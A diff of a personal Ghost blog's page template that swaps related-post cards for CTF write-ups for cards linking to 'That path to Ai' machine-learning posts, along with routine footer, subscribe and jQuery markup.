-        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg 300w,
-                   ../content/images/size/w600/2020/04/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg 600w,
-                  ../content/images/size/w1000/2020/04/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg 1000w,
-                 ../content/images/size/w2000/2020/04/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="../content/images/size/w600/2020/04/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg" alt="YearOfTheRabbit | CTF write-up">
-    </a>
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="../yearoftherabbit-ctf-write-up/">
-
-            <header class="post-card-header">
-                    <div class="post-card-primary-tag">CTF</div>
-                <h2 class="post-card-title">YearOfTheRabbit | CTF write-up</h2>
-            </header>
-
-            <section class="post-card-excerpt">
-                    <p>TryHackMe | Year of the RabbitTime to enter the warren...TryHackMeHello everyone, Today's challenge is full of surprises and I would suggest you be patient while doing it, and make sure</p>
-            </section>
-
-        </a>
-
-        <footer class="post-card-meta">
-            <ul class="author-list">
-                <li class="author-list-item">
-            
-                    <div class="author-name-tooltip">
-                        fr33s0ul
-                    </div>
-            
-                    <a href="../author/fr33s0ul/" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
-                    </a>
-                </li>
-            </ul>
-            <div class="post-card-byline-content">
-                <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
-                <span class="post-card-byline-date"><time datetime="2020-04-22">22 Apr 2020</time> <span class="bull">•</span> 9 min read</span>
-            </div>
-        </footer>
-
-    </div>
-
-</article>
-
-                <article class="post-card post tag-ctf ">
-
-    <a class="post-card-image-link" href="../lfi/">
-        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/653aa50b92574882f.png 300w,
-                   ../content/images/size/w600/2020/04/653aa50b92574882f.png 600w,
-                  ../content/images/size/w1000/2020/04/653aa50b92574882f. png 1000w,
-                 ../content/images/size/w2000/2020/04/653aa50b92574882f. png 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="../content/images/size/w600/2020/04/653aa50b92574882f.png" alt="Local file inclusion | write-up">
-    </a>
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="../lfi/">
-
-            <header class="post-card-header">
-                    <div class="post-card-primary-tag">CTF</div>
-                <h2 class="post-card-title">Local file inclusion | write-up</h2>
-            </header>
-
-            <section class="post-card-excerpt">
-                    <p>Hello everyone, here's a quick write-up about LFI that I really recommend for people just starting in the field. It's created by a user called falconfeast feel free to visit</p>
-            </section>
-
-        </a>
-
-        <footer class="post-card-meta">
-            <ul class="author-list">
-                <li class="author-list-item">
-            
-                    <div class="author-name-tooltip">
-                        fr33s0ul
-                    </div>
-            
-                    <a href="../author/fr33s0ul/" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
-                    </a>
-                </li>
-            </ul>
-            <div class="post-card-byline-content">
-                <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
-                <span class="post-card-byline-date"><time datetime="2020-04-17">17 Apr 2020</time> <span class="bull">•</span> 6 min read</span>
-            </div>
-        </footer>
-
-    </div>
-
-</article>
+    <section class="footer-cta cta-alt">
+        <div class="inner">
+            <h2>Sign up for more like this.</h2>
+            <a class="footer-cta-button" href="index.html#/portal" data-portal>
+                <div class="footer-cta-input">Enter your email</div>
+                <span>Subscribe</span>
+            </a>
         </div>
-    </div>
-</aside>
+    </section>
 
 
 
 
-        <footer class="site-footer outer">
-            <div class="site-footer-content inner">
-                <section class="copyright"><a href="../">fr33s0ul</a> © 2020</section>
-                <nav class="site-footer-nav">
-                    <a href="../">Latest Posts</a>
-                    
-                    <a href="https://twitter.com/fr3350u1" target="_blank" rel="noopener">Twitter</a>
-                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
-                </nav>
+            <aside class="read-more-wrap">
+                <div class="read-more inner">
+                        
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="../that-path-to-ai-8-hacking-ai-with-adv-machine-learning/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2020/11/aiHackss-1.gif 300w,
+                   ../content/images/size/w600/2020/11/aiHackss-1. gif 600w,
+                  ../content/images/size/w1000/2020/11/aiHackss-1. gif 1000w,
+                 ../content/images/size/w2000/2020/11/aiHackss-1. gif 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2020/11/aiHackss-1.gif"
+            alt="That path to Ai: #8 Hacking Ai with Adv machine learning"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../that-path-to-ai-8-hacking-ai-with-adv-machine-learning/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">That path to Ai: #8 Hacking Ai with Adv machine learning</h2>
+            </header>
+            <div class="post-card-excerpt">
+                <p>Adversarial machine learning Adversarial machine learning exploits how artificial intelligence algorithms work to disrupt the conduct of artificial intelligence algorithms. In the past years, adversarial machine learning has become an active zone of research as the job of AI continues to grow in vast numbers of the applications we use.</p>
+            </div>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/fr33s0ul/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" loading="lazy" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span class="post-card-byline-author"><a href="../author/fr33s0ul/index.html">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-11-21">Nov 21, 2020</time> <span class="bull">&bull;</span> 3 min read</span>
             </div>
         </footer>
 
     </div>
 
+</article>
+                        
+<article class="post-card post ">
 
-    <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
-    </script>
-    <script src="../assets/built/casper.js?v=8ba882e352"></script>
+    <a class="post-card-image-link" href="../that-path-to-ai-7/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2020/11/dnn.png 300w,
+                   ../content/images/size/w600/2020/11/dnn.png 600w,
+                  ../content/images/size/w1000/2020/11/dnn. png 1000w,
+                 ../content/images/size/w2000/2020/11/dnn. png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2020/11/dnn.png"
+            alt="That path to Ai: #7 CNNs, RNNs, Feature eng ML / imputaxon"
+            loading="lazy"
+        />
+    </a>
 
-    <script>
-        // Parse the URL parameter
-        function getParameterByName(name, url) {
-            if (!url) url = window.location.href;
-            name = name.replace(/[\[\]]/g, "\\$&");
-            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-                results = regex.exec(url);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\+/g, " "));
-        }
+    <div class="post-card-content">
 
-        // Give the parameter a variable name
-        var action = getParameterByName('action');
-        var success = getParameterByName('success');
+        <a class="post-card-content-link" href="../that-path-to-ai-7/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">That path to Ai: #7 CNNs, RNNs, Feature eng ML / imputaxon</h2>
+            </header>
+            <div class="post-card-excerpt">
+                <p>Convolutional Neural Networks (CNNs) A Convolutional Neural Networks (CNNs) is a Deep Learning algorithm which can take in an input picture, appoint significance (learnable weights and biases) to different articles in the image and have the option to separate one from the other. The pre-processing required in a CNNs; it</p>
+            </div>
+        </a>
 
-        $(document).ready(function () {
-            if (action == 'subscribe' && (success === null || success === 'true')) {
-                $('body').addClass('subscribe-success');
-            }
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/fr33s0ul/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" loading="lazy" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span class="post-card-byline-author"><a href="../author/fr33s0ul/index.html">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-11-21">Nov 21, 2020</time> <span class="bull">&bull;</span> 3 min read</span>
+            </div>
+        </footer>
 
-            if (action == 'subscribe' && success === 'false') {
-                $('body').addClass('subscribe-failure');
-            }
+    </div>
 
-            $('.subscribe-notification .subscribe-close-button').click(function () {
-                $('.subscribe-notification').addClass('close');
-            });
+</article>
+                        
+<article class="post-card post ">
 
-            // Reset form on opening subscrion overlay
-            $('.subscribe-button').click(function() {
-                $('.subscribe-overlay form').removeClass();
-                $('.subscribe-email').val('');
-            });
-        });
-    </script>
+    <a class="post-card-image-link" href="../that-path-to-ai-6/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2020/11/Dimensionality.png 300w,
+                   ../content/images/size/w600/2020/11/Dimensionality.png 600w,
+                  ../content/images/size/w1000/2020/11/Dimensionality. png 1000w,
+                 ../content/images/size/w2000/2020/11/Dimensionality. png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2020/11/Dimensionality.png"
+            alt="That path to Ai: #6 Dimensionality reduction / and ens learning to improve classifi..."
+            loading="lazy"
+        />
+    </a>
 
-    <script>
-    $(document).ready(function () {
-        // FitVids - start
-        var $postContent = $(".post-full-content");
-        $postContent.fitVids();
-        // FitVids - end
+    <div class="post-card-content">
 
-        // Replace nav with title on scroll - start
-        Casper.stickyNavTitle({
-            navSelector: '.site-nav-main',
-            titleSelector: '.post-full-title',
-            activeClass: 'nav-post-title-active'
-        });
-        // Replace nav with title on scroll - end
+        <a class="post-card-content-link" href="../that-path-to-ai-6/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">That path to Ai: #6 Dimensionality reduction / and ens learning to improve classifi...</h2>
+            </header>
+            <div class="post-card-excerpt">
+                <p>Dimensionality reduction is a set of machine learning-based indicative models. They are useful to execute data manipulation; it decreases the dimensionality of a dataset. It is instrumental in cases where the issue becomes intractable, and the quantity of variables increases, then dimensionality reduction leads to choosing significant variables. Low variance</p>
+            </div>
+        </a>
 
-        // Hover on avatar
-        var hoverTimeout;
-        $('.author-list-item').hover(function () {
-            var $this = $(this);
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/fr33s0ul/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" loading="lazy" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span class="post-card-byline-author"><a href="../author/fr33s0ul/index.html">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-11-21">Nov 21, 2020</time> <span class="bull">&bull;</span> 4 min read</span>
+            </div>
+        </footer>
 
-            clearTimeout(hoverTimeout);
+    </div>
 
-            $('.author-card').removeClass('hovered');
-            $(this).children('.author-card').addClass('hovered');
+</article>
+                </div>
+            </aside>
 
-        }, function () {
-            var $this = $(this);
 
-            hoverTimeout = setTimeout(function () {
-                $this.children('.author-card').removeClass('hovered');
-            }, 800);
-        });
+
+    </div>
+
+    <footer class="site-footer outer">
+        <div class="inner">
+            <section class="copyright"><a href="../index.html">fr33s0ul</a> &copy; 2022</section>
+            <nav class="site-footer-nav">
+                
+            </nav>
+            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
+        </div>
+    </footer>
+
+</div>
+
+
+<script
+    src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
+    crossorigin="anonymous">
+</script>
+<script src="../assets/built/casper.js?v=7717a9b749"></script>
+<script>
+$(document).ready(function () {
+    // Mobile Menu Trigger
+    $('.gh-burger').click(function () {
+        $('body').toggleClass('gh-head-open');
     });
+    // FitVids - Makes video embeds responsive
+    $(".gh-content").fitVids();
+});
 </script>
 
 
-    
 
 </body>
+</html>
